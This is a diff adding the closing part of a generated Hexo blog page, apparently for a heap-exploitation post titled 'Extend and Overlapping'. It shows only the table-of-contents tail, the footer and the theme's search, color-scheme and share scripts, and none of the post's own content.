href="#3%E3%80%81%E6%89%93%E5%8D%B0%E5%A0%86%E5%9D%97"><span class="toc-text">3、打印堆块</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4%E3%80%81%E5%88%A0%E9%99%A4%E5%A0%86%E5%9D%97"><span class="toc-text">4、删除堆块</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">总结：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp%EF%BC%9A"><span class="toc-text">exp：</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2023 Closure</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Extend%20and%20Overlapping + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F03%2F03%2FExtend-and-Overlapping%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/03/03/Extend-and-Overlapping/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
